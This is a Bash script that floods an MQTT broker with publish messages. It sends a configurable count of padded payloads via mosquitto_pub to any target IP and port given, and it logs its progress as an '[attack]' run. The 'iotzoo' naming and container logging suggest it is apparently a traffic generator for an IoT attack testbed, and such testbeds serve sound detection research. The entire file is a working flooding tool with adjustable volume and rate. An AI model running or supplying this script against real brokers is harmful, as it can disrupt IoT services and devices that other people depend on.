#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-${TARGET_IP:-}}"
PORT="${2:-${TARGET_PORT:-1883}}"
: "${TARGET:?target IP/FQDN required}"

COUNT="${COUNT:-300}"
DELAY_MS="${DELAY_MS:-10}"
PAYLOAD_SIZE="${PAYLOAD_SIZE:-128}"
QOS="${QOS:-0}"
TOPIC_PREFIX="${TOPIC_PREFIX:-attack/mqtt_publisher_flood}"
CLIENT_ID="${CLIENT_ID:-iotzoo_mqtt_pub_flood_$$}"
PUBLISH_TIMEOUT_S="${PUBLISH_TIMEOUT_S:-3}"

sleep_delay() {
  if [ "${DELAY_MS}" -gt 0 ]; then
    sleep "$(printf "%d.%03d" $((DELAY_MS / 1000)) $((DELAY_MS % 1000)))"
  fi
}

make_payload() {
  if [ "${PAYLOAD_SIZE}" -gt 0 ]; then
    # Avoid pipelines: with `set -o pipefail`, generators such as `yes | head`
    # exit with SIGPIPE (rc=141) before MQTT traffic is actually sent.
    local n="${PAYLOAD_SIZE}"
    local chunk="MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
    local out=""
    while [ "${#out}" -lt "${n}" ]; do
      out="${out}${chunk}"
    done
    printf '%s' "${out:0:${n}}"
  else
    printf 'IoT-Zoo MQTT publisher flood message'
  fi
}

publish_one() {
  local i="$1"
  local msg="$2"

  # Do not use mosquitto_pub -W: older mosquitto-clients versions do not support it.
  # Use coreutils timeout when available; otherwise call mosquitto_pub directly.
  if command -v timeout >/dev/null 2>&1; then
    timeout "${PUBLISH_TIMEOUT_S}s" mosquitto_pub \
      -h "${TARGET}" \
      -p "${PORT}" \
      -i "${CLIENT_ID}_${i}" \
      -q "${QOS}" \
      -t "${TOPIC_PREFIX}/${i}" \
      -m "${msg}"
  else
    mosquitto_pub \
      -h "${TARGET}" \
      -p "${PORT}" \
      -i "${CLIENT_ID}_${i}" \
      -q "${QOS}" \
      -t "${TOPIC_PREFIX}/${i}" \
      -m "${msg}"
  fi
}

echo "[attack] mqtt_publisher_flood target=${TARGET}:${PORT} count=${COUNT} delay_ms=${DELAY_MS} payload_size=${PAYLOAD_SIZE} qos=${QOS} topic_prefix=${TOPIC_PREFIX} publish_timeout_s=${PUBLISH_TIMEOUT_S}"
echo "[attack] source container=$(hostname) started_at=$(date -Is 2>/dev/null || date)"

echo "[attack] mosquitto_pub version/help check"
mosquitto_pub --help 2>&1 | head -5 || true

sent=0
failed=0
for i in $(seq 1 "${COUNT}"); do
  MSG="$(make_payload)"
  if publish_one "${i}" "${MSG}"; then
    sent=$((sent + 1))
  else
    rc=$?
    failed=$((failed + 1))
    if [ "${failed}" -le 10 ]; then
      echo "[attack] publish failed i=${i} rc=${rc}" >&2
    fi
  fi
  sleep_delay
done

echo "[attack] mqtt_publisher_flood completed sent=${sent} failed=${failed}"
